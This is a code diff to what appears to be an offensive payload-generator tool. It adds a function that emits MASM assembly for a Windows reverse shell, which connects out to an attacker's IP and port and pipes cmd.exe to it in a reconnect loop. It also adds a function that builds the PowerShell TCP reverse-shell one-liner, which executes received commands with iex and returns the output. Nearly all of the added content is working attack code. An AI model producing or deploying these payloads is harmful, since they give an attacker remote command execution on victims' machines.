@@ -64,6 +64,59 @@ end
 	""" % (IP,PORT)
 	return db
 
+def asmreverse_tcp( IP=None, PORT=None):
+	#https://github.com/xillwillx/Mini_Reverse_Shell/blob/master/minireverse.asm
+	db = '''.386
+.model flat, stdcall
+option casemap:none
+include \masm32\include\windows.inc
+include \masm32\include\kernel32.inc
+include \masm32\include\ws2_32.inc
+include \masm32\include\masm32.inc
+includelib \masm32\lib\ws2_32.lib
+includelib \masm32\lib\kernel32.lib
+includelib \masm32\lib\masm32.lib 
+
+.data
+  cmd     db "cmd",0
+  UrIP    db "{0}",0
+  port    db "{1}",0
+.data?
+  sinfo   STARTUPINFO<>
+  pi      PROCESS_INFORMATION<>
+  sin     sockaddr_in<>
+  WSAD    WSADATA<>
+  Wsocket dd ?
+.code
+start:
+    invoke WSAStartup, 101h, addr WSAD 
+    invoke WSASocket,AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,0,0
+           mov Wsocket, eax
+           mov sin.sin_family, 2
+    invoke atodw, addr port
+    invoke htons, eax
+           mov sin.sin_port, ax
+    invoke gethostbyname, addr UrIP
+          mov eax, [eax+12]
+          mov eax, [eax]
+          mov eax, [eax]
+          mov sin.sin_addr, eax
+
+          mov eax,Wsocket
+          mov sinfo.hStdInput,eax
+          mov sinfo.hStdOutput,eax
+          mov sinfo.hStdError,eax     
+          mov sinfo.cb,sizeof STARTUPINFO
+          mov sinfo.dwFlags,STARTF_USESHOWWINDOW+STARTF_USESTDHANDLES
+ shellagain:
+    invoke connect, Wsocket, addr sin , sizeof(sockaddr_in) 
+    invoke CreateProcess,NULL,addr cmd,NULL,NULL,TRUE,8000040h,NULL,NULL,addr sinfo,addr pi
+    invoke WaitForSingleObject,pi.hProcess,INFINITE
+	jmp shellagain
+ ret
+end start
+	'''.format(IP,PORT)
+	return db
 
 
 def pyreverse_tcp( IP=None, PORT=None):
@@ -175,3 +228,17 @@ def linx64reverse_tcp( IP=None, PORT=None):
 	shellcode += padd.replace("\n", "")
 	shellcode += "5002e7368737472746162002e7465787400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b000000010000000600000000000000800040000000000080000000000000001f000000000000000000000000000000100000000000000000000000000000000100000003000000000000000000000000000000000000009f000000000000001100000000000000000000000000000001000000000000000000000000000000"
 	return shellcode
+
+
+def powershell( ip,port):
+    db = ["" for x in range(8)]
+    payload = '$client = New-Object System.Net.Sockets.TCPClient("%s",%s)' % (ip,port)
+    db[0] = payload
+    db[1] = '$stream = $client.GetStream()'
+    db[2] = '[byte[]]$bytes = 0..255|%{0}'
+    db[3] = 'while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){'
+    db[4] = '$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)'
+    db[5] = '$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> "'
+    db[6] = '$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length)'
+    db[7] = '$stream.Flush()};$client.Close()'
+    return ";".join(db)
